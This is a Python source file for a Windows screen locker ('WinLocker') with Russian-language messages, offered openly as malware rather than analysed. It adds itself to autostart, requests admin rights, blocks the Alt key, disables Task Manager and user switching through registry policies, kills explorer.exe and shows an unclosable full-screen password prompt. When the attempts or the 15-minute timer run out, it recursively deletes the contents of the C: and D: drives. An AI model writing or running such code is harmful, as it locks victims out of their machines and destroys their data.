from tkinter import *
from tkinter.messagebox import showinfo
import platform
import hashlib
import winreg
import shutil
import sys
import ctypes
import traceback
import keyboard
import winsound
import os
import shutil
import datetime

keyboard.block_key('alt')

def add_to_autostart():
    script_path = os.path.abspath(sys.argv[0])  
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    app_name = "MyPythonApp"  

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, script_path)
            print(f"Программа добавлена в автозагрузку: {script_path}")
    except Exception as e:
        print(f"Ошибка добавления в автозагрузку: {e}")

add_to_autostart()

def copy():
    shutil.copy('WinLocker.py', 'D:\\asdasdasd')
#copy()

def kill_explorer():
    os.system('taskkill /F /IM explorer.exe')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if __name__ == "__main__":
    if is_admin():
        print("Скрипт запущен с правами администратора.")
    else:

        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )


def disable_task_manager():
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)


def disable_switch_user():
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")

        winreg.SetValueEx(key, "HideFastUserSwitching", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)


    except Exception as e:
        print(f"Ошибка: {e}")


disable_switch_user()
disable_task_manager()
kill_explorer()

timer_seconds = 900
password = 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3'
OS = platform.system() + platform.release()
attempts = 3  # Количество попыток
my_system = platform.uname()

def disable_close_button():
    pass

def delete_windows():
    path = r'D:'
    path2 = r'C:'
    for file in os.listdir(path):
        file_path = os.path.join(path, file)
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except PermissionError:
            print(f"Не удалось удалить: {file_path}")
    for file in os.listdir(path2):
        file_path = os.path.join(path, file)
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except PermissionError:
            print(f"Не удалось удалить: {file_path}")



def my_hash(text):
    return hashlib.sha256(text.encode()).hexdigest()
def update_attempts_label():
    attempts_label.config(text=f"Оставшиеся попытки: {attempts}")

def Buton():
    global attempts
    if my_hash(text.get()) == password:
        reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name = "MyPythonApp"  
        os.system('start explorer.exe')
        root.destroy()
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, app_name)
            print("Программа удалена из автозагрузки.")
        except FileNotFoundError:
            print("Программа не найдена в автозагрузке.")
        except Exception as e:
            print(f"Ошибка удаления из автозагрузки: {e}")
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                                   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")

            winreg.SetValueEx(key, "HideFastUserSwitching", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)

            print("Пункт 'Сменить пользователя' успешно включён!")
        except Exception as e:
            print(f"Ошибка: {e}")
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                   r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            print("Диспетчер задач успешно восстановлен!")
        except Exception as e:
            print(f"Ошибка при восстановлении диспетчера задач: {e}")

    else:
        attempts -= 1
        if attempts <= 0:
            showinfo(title="=)", message="Попытки закончились!")
            delete_windows()
        else:
            showinfo(title="=)", message="Неправильный пароль! Попробуйте снова.")
        update_attempts_label()


def update_timer():
    global timer_seconds  
    if timer_seconds > 0:
        hours, remainder = divmod(timer_seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        timer_label.config(text=f"Таймер: {hours:02}:{minutes:02}:{seconds:02}")
        timer_seconds -= 1
        root.after(1000, update_timer)
    else:
        showinfo(title="Таймер", message="Время истекло!")
        delete_windows()



root = Tk()
root.protocol("WM_DELETE_WINDOW", disable_close_button)
root.configure(background='black')
text = StringVar()

root.title("Locker")
root.geometry("1000x1000")
root.attributes("-topmost", 1)
root.overrideredirect(1)
root.wm_state('zoomed')

Label(text=OS + " Заблокирована!", bg='black', fg='green', font="Arial 30").pack()
Entry(textvariable=text, width=100, bg='grey', fg="black", font='Arial 24').pack()
Button(text="Ввести", command=Buton, bg='red', width=20, font="Arial 30").pack()
Button(text="Удалить Windows", command=delete_windows, bg='red', width=20, font="Arial 30").pack()

attempts_label = Label(text=f"Попытки: {attempts}", bg='black',fg='green',  font="Arial 30")
attempts_label.pack()

info_frame = Frame(root, bg='black')
info_frame.pack(side=LEFT, fill=BOTH)

Label(info_frame, text=f"Система: {my_system.system}", bg='black', fg='green', font="Arial 30", anchor='w').pack(fill='both')
Label(info_frame, text=f"Node name: {my_system.node}", bg='black', fg='green', font="Arial 30", anchor='w').pack(fill='both')
Label(info_frame, text=f"Релиз: {my_system.release}", bg='black', fg='green', font="Arial 30", anchor='w').pack(fill='both')
Label(info_frame, text=f"Полная версия: {my_system.version}", bg='black', fg='green', font="Arial 30", anchor='w').pack(fill='both')
Label(info_frame, text=f"Машина: {my_system.machine}", bg='black', fg='green', font="Arial 30", anchor='w').pack(fill='both')
Label(info_frame, text=f"Процессор: {my_system.processor}", bg='black', fg='green', font="Arial 30", anchor='w').pack(fill='both')



timer_label = Label(root, text="Таймер: 00:00:00", bg='black', fg='green', font="Arial 30", )
timer_label.pack(fill='both')
Label(root, text=f"Создано : wsffxs, Catholic", bg='black', fg='green', font="Arial 30", anchor='e').pack()

update_timer()

root.mainloop()

winsound.Beep(400, 1000)
